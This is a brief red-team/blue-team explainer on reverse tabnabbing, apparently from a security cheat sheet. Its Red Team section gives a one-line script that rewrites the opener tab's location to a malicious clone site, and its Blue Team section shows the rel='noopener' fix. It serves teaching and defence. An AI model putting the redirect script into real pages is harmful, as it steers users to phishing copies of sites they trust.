# Reverse Tabnabbing

Reverse Tabnabbing happens when a linked to site modifies the opener location, thereby tricking a user, when they click back to the original tab, into thinking they are returning to the original website.

## Red Team

Create a site that mimicks your target site. Include a script that changes the opener location of the referring site.

```html
<!-- Target site: https://example.com -->
<!-- Your linked to site (posted somewhere like a forum): https://containstabnabbingscript.com -->
<!-- Included script: -->
<script>opener.location="https://mymaliciousexampleclone.com";</script>
```

## Blue Team

Use `rel="noopener"` for any user supplied links.

```html
<!-- Good -->
<a href="https://useruploadedsite.com/reversetabnabbinglink" target="_blank" rel="noopener">Check it out!</a>
<script>
  window.open('https://useruploadedsite.com/reversetabnabbinglink', 'new window name', 'noopener');
</script>

<!-- Bad -->
<a href="https://useruploadedsite.com/reversetabnabbinglink" target="_blank">Check it out!</a>
<script>
  window.open('https://useruploadedsite.com/reversetabnabbinglink', 'new window name');
</script>
```
